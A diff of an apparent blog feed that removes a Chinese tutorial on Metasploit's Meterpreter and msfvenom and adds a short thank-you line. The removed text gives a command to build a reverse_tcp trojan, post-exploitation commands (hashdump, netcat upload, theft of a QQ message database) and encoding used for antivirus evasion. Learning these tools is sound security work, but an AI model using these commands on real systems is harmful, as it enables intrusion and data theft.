-&lt;p&gt;最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。&lt;/p&gt;
-
-&lt;p&gt;需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况&lt;/p&gt;
-
-&lt;h2 id=&quot;常用的反弹类型&quot;&gt;常用的反弹类型&lt;/h2&gt;
-
-&lt;h3 id=&quot;reverse_tcp&quot;&gt;reverse_tcp&lt;/h3&gt;
-
-&lt;p&gt;这是一个基于TCP的反向链接反弹shell, 使用起来很稳定&lt;/p&gt;
-
-&lt;p&gt;使用下列命令生成一个Linux下反弹shell木马：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=你的IP lport=监听端口  -f elf -o shell
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;关于生成木马后续再提&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样,配置好参数就可以开始监听,当目标运行木马们就可以反弹shell了&lt;/p&gt;
-
-&lt;h3 id=&quot;reverse_http&quot;&gt;reverse_http&lt;/h3&gt;
-
-&lt;p&gt;基于http方式的反向连接，在网速慢的情况下不稳定&lt;/p&gt;
-
-&lt;h3 id=&quot;bind_tcp&quot;&gt;bind_tcp&lt;/h3&gt;
-
-&lt;p&gt;这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST&lt;/p&gt;
-
-&lt;h2 id=&quot;payload&quot;&gt;Payload&lt;/h2&gt;
-
-&lt;p&gt;Metasploit中的Payload模块主要有以下三种类型：&lt;/p&gt;
-
-&lt;p&gt;-Single&lt;/p&gt;
-
-&lt;p&gt;-Stager&lt;/p&gt;
-
-&lt;p&gt;-Stage&lt;/p&gt;
-
-&lt;p&gt;Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似&lt;a href=&quot;https://en.wikipedia.org/wiki/Netcat&quot;&gt;netcat&lt;/a&gt;这样的非metasploit处理工具所捕捉到。&lt;/p&gt;
-
-&lt;p&gt;Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。&lt;/p&gt;
-
-&lt;p&gt;Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制&lt;/p&gt;
-
-&lt;h2 id=&quot;meterpreter的常用命令&quot;&gt;Meterpreter的常用命令&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;help# 查看Meterpreter帮助
-background#返回，把meterpreter后台挂起
-bgkill# 杀死一个背景 meterpreter 脚本
-bglist#提供所有正在运行的后台脚本的列表
-bgrun#作为一个后台线程运行脚本
-channel#显示活动频道
-sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
-sesssions -k  number #与会话进行交互
-close# 关闭通道
-exit# 终止 meterpreter 会话
-quit# 终止 meterpreter 会话
-interact id #切换进一个信道
-run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
-irb# 进入 Ruby 脚本模式
-read# 从通道读取数据
-write# 将数据写入到一个通道
-run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
-use# 加载 meterpreter 的扩展
-load/use#加载模块
-
-Resource#执行一个已有的rc脚本
-
-2.文件系统命令
-
-cat c:\boot.ini#查看文件内容,文件必须存在
-
-del c:\boot.ini #删除指定的文件
-
-upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\
-
-download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/
-
-edit c:\boot.ini  # 编辑文件
-
-getlwd#打印本地目录
-
-getwd#打印工作目录
-
-lcd#更改本地目录
-
-ls#列出在当前目录中的文件列表
-
-lpwd#打印本地目录
-
-pwd#输出工作目录
-
-cd c:\\ #进入目录文件下
-
-rm file #删除文件
-
-mkdir dier #在受害者系统上的创建目录
-
-rmdir#受害者系统上删除目录
-
-dir#列出目标主机的文件和文件夹信息
-
-mv#修改目标主机上的文件名
-
-search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc
-
-meterpreter &amp;gt; search -f autoexec.bat  #搜索文件
-
-meterpreter &amp;gt; search -f sea*.bat c:\\xamp\\
-
-enumdesktops     #用户登录数
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;msfvenom&quot;&gt;msfvenom&lt;/h1&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;木马生成工具&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;help-1&quot;&gt;HELP&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Options:
--p, --payload    &amp;lt;payload&amp;gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;amp;#039;-&amp;amp;#039;或者stdin指定
--l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
--n, --nopsled    &amp;lt;length&amp;gt;        为payload预先指定一个NOP滑动长度
--f, --format     &amp;lt;format&amp;gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
--e, --encoder    [encoder]       指定需要使用的encoder（编码器）
--a, --arch       &amp;lt;architecture&amp;gt;  指定payload的目标架构
---platform   &amp;lt;platform&amp;gt;      指定payload的目标平台
--s, --space      &amp;lt;length&amp;gt;        设定有效攻击荷载的最大长度
--b, --bad-chars  &amp;lt;list&amp;gt;          设定规避字符集，比如: &amp;amp;#039;\x00\xff&amp;amp;#039;
--i, --iterations &amp;lt;count&amp;gt;         指定payload的编码次数
--c, --add-code   &amp;lt;path&amp;gt;          指定一个附加的win32 shellcode文件
--x, --template   &amp;lt;path&amp;gt;          指定一个自定义的可执行文件作为模板
--k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
---payload-options            列举payload的标准选项
--o, --out   &amp;lt;path&amp;gt;               保存payload
--v, --var-name &amp;lt;name&amp;gt;            指定一个自定义的变量，以确定输出格式
---shellest                   最小化生成payload
--h, --help                       查看帮助选项
---help-formats               查看msf支持的输出格式列表
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;生成payload&quot;&gt;&lt;strong&gt;生成payload&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;生成payload，有有两个必须的选项：-p -f&lt;/p&gt;
-
-&lt;p&gt;使用-p 来指定要使用的payload&lt;/p&gt;
-
-&lt;p&gt;可以使用下面的命令来查看所有msf可用的payload列表&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l payloads
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;-p选项也支持使用使用自定义的payload，需要使用 “-“，比如:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;使用-f 来指定payload的输出格式&lt;/p&gt;
-
-&lt;p&gt;使用下面的命令，可以产看msf支持的输出格式&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom --help-formats
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;payload编码&quot;&gt;&lt;strong&gt;payload编码&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;如果你使用了-b选项（设定了规避字符集），会自动调用编码器&lt;/p&gt;
-
-&lt;p&gt;其他情况下，你需要使用-e选项来使用编码模块，例如&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以使用下面的命令，来查看可用的编码器&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -l encoders
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案&lt;/p&gt;
-
-&lt;p&gt;可以使用下面的命令来进行迭代编码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;规避字符&quot;&gt;&lt;strong&gt;规避字符&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./msfvenom -p windows/meterpreter/bind_tcp -b &amp;amp;#039;\x00&amp;amp;#039; -f raw
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
+&lt;p&gt;感谢吴同学分享的脚本,[github](https://github.com/Sherlockouo/script/tree/master/study&lt;/p&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry></feed>
